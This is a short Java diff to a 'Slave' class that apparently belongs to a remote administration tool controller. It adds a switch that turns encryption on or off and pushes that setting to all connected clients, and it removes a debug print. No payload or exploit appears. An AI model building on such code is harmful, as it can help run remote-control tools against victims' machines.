@@ -35,6 +35,8 @@ import com.redpois0n.util.Util;
 @SuppressWarnings("unused")
 public class Slave extends CustomStream implements Runnable {
 
+	public static boolean encryption = true;
+
 	private Socket socket;
 
 	private DataInputStream dis;
@@ -174,6 +176,8 @@ public class Slave extends CustomStream implements Runnable {
 				enc = "-h " + Hex.encode(s);
 			} else if (s.startsWith("-c ")) {
 				enc = s;
+			} else if (!encryption) {
+				enc = "-c " + s;
 			}
 
 			// dos.writeUTF(enc);
@@ -195,7 +199,7 @@ public class Slave extends CustomStream implements Runnable {
 		}
 
 		String s = builder.toString();
-		System.out.println(s);
+
 		if (s.startsWith("-h ")) {
 			s = Hex.decode(s.substring(3, s.length()));
 		} else if (s.startsWith("-c ")) {
@@ -553,5 +557,14 @@ public class Slave extends CustomStream implements Runnable {
 
 	public void lock() {
 		lock = !lock;
+	}
+
+	public static final synchronized void toggleEncryption(boolean b) {
+		encryption = b;
+
+		for (Slave slave : Main.connections) {
+			slave.addToSendQueue(new PacketBuilder(Header.ENCRYPTION, b));
+		}
+
 	}
 }
